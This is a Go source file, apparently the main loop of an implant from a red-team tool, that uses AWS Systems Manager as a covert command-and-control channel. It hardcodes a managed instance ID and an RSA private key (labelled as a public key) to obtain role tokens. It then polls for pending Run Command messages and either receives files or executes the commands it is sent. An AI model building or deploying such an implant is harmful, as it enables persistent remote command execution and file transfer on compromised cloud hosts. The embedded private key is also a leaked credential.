package main

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/aws/amazon-ssm-agent/agent/jsonutil"
	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/implantrun"
	"github.com/grines/ssmmm/implant/implantup"
	"github.com/grines/ssmmm/implant/implantutil"
)

const managedInstanceID string = "mi-0d416eb76fdc3f731"
const publicKey string = "MIIEowIBAAKCAQEAwCWYd69ADZjlmqvP+NtnWQi82cq+TmpHMlvNzHm2VXmxgEikNUDGcK9JxsgrIDw6T0EzRFXbl2X2vpqAtX3lV+ALs+sSwNkYrPUtBFwxydxwUHuq+4QJcIfRMsRjwPLOEon5zYBdvbu3AWhq4OHcqmYyTg3kQFW+UeH5Zsh96aDAejlHELtXYxUi12K+roefDQY5G5ePgL3+7UXGfxo/etuNOy9nNPRcNCLTt3dDNP8kc478t50PNpgDmXTataIZahte5IvUeTaaLlYqIl65NJ7RgM2PIDF1yEymnMTWUva1lG5q1Z03r9qpMxuSc2IP5+QVwueTf5OugXVwHCA8wwIDAQABAoIBAQCz3L1rE2ZPFBehgEEOfzqvsiktacZYms2Iiz0KscgHHQIVxmnH25ml87+IzujnpNkkRTEbP49tmimt4+yld3LOnk/2HA8S7GVXya1ZDoAgqDOOcyTriX5Ykxo1fnauL9rMqdFnF0koiOXW8IpTdblc3IssW36U5m5gMbqHBxguLwZQ2LOL0v0w2qDJ6nGE2kAtARVLVnB9YXVy+ouTQ4UH/UeMyZp2SVws0I96vUUZa3GaN8lYQzEKZDeLJU4HzoCvffx5ju3a6OdkS1il5SvoRgdKw/8XiOGlLgqFQLW5/nMQxEzmO9AZxFLxG1RoY8PslrNnk/Ha5azgZpqRfl5hAoGBAMy+EY+/ShJ8uS087sMwVfEEimkxmlFOFWyAvtx9D2ZddEXMn4EbTrFcm6dLawEbrzE67vEvdIS+/ps/ZLQeNCNJZBS6BmriD+2xknPDWPhvqV6gl1Dmc/AESC1OmVCVu/QubveXOFgU5/yBFW0rSVbGnlqCloPwj/uBaWRcPVwTAoGBAPBARqC+iNaM1THDUW/Gq+CN7AsVzXAfy/wPqVWwPS5wDnE7fQLIFB2ugjoxEFX8BAS1GGVNBmNPRT0jmRLtjsRyzdlX0kTMRAvQbPGcHq/5tbEIhHyycrmoD07j0hD2seb4l92YGhNUxfZYxWdg8Rlw4ce6L+m3/Jw6V3S8u1KRAoGAXFKYuKkZTZzQI4YGZB23oybZAvZLD76WCodDiUkbWJ1rgM30XtNheLi5t4ZaifVh2mEovbkYYYN+a6L6Vf4IpKDDcFUx76Bgbl5UG79Krzwqs3DWyrQgM2q64TNADwZ16nXFs/+MeKt0sHfEoaWTPH3zify4wmYHhvGkBI1TXeECgYB+c3Y5GM/xDQMRRBpS2KCSemBonTsZ7sJwktWvsikhjf0sAAGWOzTLQpRsiHJur0x2JdMHTnk0P/7TZS8mVT61iy9pW93iNBkEltkgeel0+dt1qGQDNfFIYnpcLXDdWNreFK3qBiqDTjU7qhGMjeuYVl+fvhGF1D7zA4oQeV2m4QKBgE20jUPRq6u5v6mFqojilGOFuIvGwNMyfcsTE6huImZ+3Mvxh1uvbd4LzV4XfrIlCRbmCQEcgIEx12YjtRalkna506GIIxH8Kl++39Zd7VDAal2MQH5j+IfUGqSsFg1cxWEOOboJRBSDntM47MT9803XEFSU00nSmoFsN1lRWHjP"
const fingerPrint string = "90312ec8-c247-47eb-823f-ad6e8ae1fff5"
const instanceRegion = "us-east-1"

func main() {

	for {
		//Need some custome jitter here
		time.Sleep(100 * time.Millisecond)

		//Get Service Role Token from RSA private key
		tokens := awsssm.GetRoleTokenFromRSA(managedInstanceID, publicKey, instanceRegion)

		//Update instace information to active
		awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)

		//Get pending RunCommands
		messages := awsssm.GetRunCommandMessages(tokens, managedInstanceID, instanceRegion)

		//Loop through and run commands
		for _, m := range messages.Messages {
			var payload awsssm.SendCommandPayload
			json.Unmarshal([]byte(m.Payload), &payload)
			jsonutil.Marshal(payload)
			cmdid := payload.CommandID
			if payload.OutputS3KeyPrefix != "" {
				awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
				implantup.RecieveFile(payload)

			} else {
				for _, c := range payload.Parameters {
					str := fmt.Sprintf("%v", c)
					str = strings.TrimSuffix(str, "]")
					str = implantutil.TrimFirstRune(str)
					implantrun.RunCommand(str, cmdid, tokens, managedInstanceID, instanceRegion)
				}
			}
		}
	}

}
